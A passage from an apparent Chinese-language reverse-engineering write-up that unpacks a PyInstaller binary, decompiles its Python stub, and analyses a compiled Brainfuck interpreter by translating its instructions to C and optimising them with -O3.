title="解包"></a>解包</h4><p>使用<code>pyinstxtractor</code>解包，其中包含许多编译好的库文件和部分没有后缀的文件，这些没有后缀的文件实际上时pyc文件，可以反编译得到python代码，但是需要解决一个问题，解包时没法确定python版本，这些pyc文件是没有文件头的，因此第一步是需要补上对应python版本的文件头。</p><p>比较简单的方法是找到<code>base_library.zip</code>这个压缩文件，一般解包出来都会有，里面包含许多pyc文件，从这里复制文件头可以匹配python版本，然后可以用uncompyle6反编译。</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="hljs-comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="hljs-comment"># Decompiled from: Python 3.8.10 (default, Jun  2 2021, 10:49:15) </span></span><br><span class="line"><span class="hljs-comment"># [GCC 9.4.0]</span></span><br><span class="line"><span class="hljs-comment"># Embedded file name: main.py</span></span><br><span class="line"><span class="hljs-comment"># Compiled at: 2083-07-26 15:12:22</span></span><br><span class="line"><span class="hljs-comment"># Size of source mod 2**32: 1703593186 bytes</span></span><br><span class="line"><span class="hljs-keyword">import</span> brainfuck</span><br><span class="line">brainfuck.main_check()</span><br></pre></td></tr></tbody></table></figure><p>python文件里并没有太多内容，调用了brainfuck库，主要的内容都在编译好的<code>brainfuck.cp38-win_amd64.pyd</code>中实现。</p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>pyd文件使用ida反编译，可以发现是一个brainfuck的解释器，读取一段指令然后执行，指令很多就不放了，方法是将指令转换为C语言，对应的关系为</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dic = {<span class="hljs-string">'&gt;'</span>: <span class="hljs-string">'++ptr;'</span>,</span><br><span class="line">       <span class="hljs-string">'&lt;'</span>: <span class="hljs-string">'--ptr;'</span>,</span><br><span class="line">       <span class="hljs-string">'+'</span>: <span class="hljs-string">'++*ptr;'</span>,</span><br><span class="line">       <span class="hljs-string">'-'</span>: <span class="hljs-string">'--*ptr;'</span>,</span><br><span class="line">       <span class="hljs-string">'.'</span>:<span class="hljs-string">'putchar(*ptr);'</span>,</span><br><span class="line">       <span class="hljs-string">','</span>:<span class="hljs-string">'*ptr = getchar();'</span>,</span><br><span class="line">       <span class="hljs-string">'['</span>: <span class="hljs-string">'while (*ptr) {'</span>,</span><br><span class="line">       <span class="hljs-string">']'</span>:<span class="hljs-string">'}'</span>}</span><br></pre></td></tr></tbody></table></figure><p>转换为C语言之后的代码大体为</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> *ptr = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);</span><br><span class="line">    ++ptr;</span><br><span class="line">    ++ptr;</span><br><span class="line">    ++ptr;</span><br><span class="line">   ......</span><br><span class="line">        --ptr;</span><br><span class="line">        <span class="hljs-built_in">putchar</span>(*ptr);</span><br><span class="line">        ++*ptr;</span><br><span class="line">        <span class="hljs-built_in">putchar</span>(*ptr);</span><br><span class="line">        --*ptr;</span><br><span class="line">        <span class="hljs-built_in">putchar</span>(*ptr);</span><br><span class="line">        ++*ptr;</span><br><span class="line">        <span class="hljs-built_in">putchar</span>(*ptr);</span><br><span class="line">        --*ptr;</span><br><span class="line">        <span class="hljs-built_in">putchar</span>(*ptr);</span><br><span class="line">        ++*ptr;</span><br><span class="line">        <span class="hljs-built_in">putchar</span>(*ptr);</span><br><span class="line">        --ptr;</span><br><span class="line">        --ptr;</span><br><span class="line">        <span class="hljs-keyword">while</span> (*ptr)</span><br><span class="line">        {</span><br><span class="line">            --*ptr;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">   ......</span><br><span class="line">    --ptr;</span><br><span class="line">    --ptr;</span><br><span class="line">    --ptr;</span><br><span class="line">    --ptr;</span><br><span class="line">    --ptr;</span><br><span class="line">    --ptr;</span><br><span class="line">    --ptr;</span><br><span class="line">    --ptr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>指令太多不好分析，此时借助编译器的优化，合并和去除无用的指令，然后进行反编译更容易梳理代码的逻辑，直接使用<code>-O3</code>标志进行最大程度的优化。</p><p>此时反编译出来的结果更易读，可调试，容易分析出代码的执行逻辑</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span 